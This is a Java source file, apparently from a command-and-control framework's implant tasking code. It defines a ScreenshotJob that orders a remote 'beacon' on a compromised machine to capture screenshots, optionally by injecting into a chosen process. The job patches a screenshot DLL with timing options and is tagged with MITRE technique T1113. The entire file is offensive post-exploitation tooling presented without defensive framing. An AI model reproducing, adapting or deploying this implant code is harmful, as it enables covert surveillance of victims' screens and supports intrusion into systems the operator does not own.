package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;

public class ScreenshotJob
        extends Job {
    protected int time;

    public ScreenshotJob(TaskBeacon tasker, int time) {
        super(tasker);
        this.time = time * 1000;
    }

    @Override
    public String getDescription() {
        if (this.isInject() && this.time > 0) {
            return "Tasked beacon to take screenshots in " + this.pid + "/" + this.arch + " for next " + this.time / 1000 + " seconds";
        }
        if (this.isInject()) {
            return "Tasked beacon to take a screenshot in " + this.pid + "/" + this.arch;
        }
        if (this.time > 0) {
            return "Tasked beacon to take screenshots for next " + this.time / 1000 + " seconds";
        }
        return "Tasked beacon to take screenshot";
    }

    @Override
    public String getShortDescription() {
        return "take screenshot";
    }

    @Override
    public String getDLLName() {
        if (this.arch.equals("x64")) {
            return "resources/screenshot.x64.dll";
        }
        return "resources/screenshot.dll";
    }

    @Override
    public String getPipeName() {
        return "screenshot";
    }

    @Override
    public int getCallbackType() {
        return 3;
    }

    @Override
    public int getWaitTime() {
        return 15000;
    }

    @Override
    public byte[] fix(byte[] mydll) {
        Packer packer = new Packer();
        packer.little();
        packer.addInt(this.time);
        String options = CommonUtils.pad(CommonUtils.bString(packer.getBytes()), '\u0000', 128);
        mydll = CommonUtils.patch(mydll, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR", options);
        return mydll;
    }

    @Override
    public String getTactic() {
        return "T1113";
    }
}

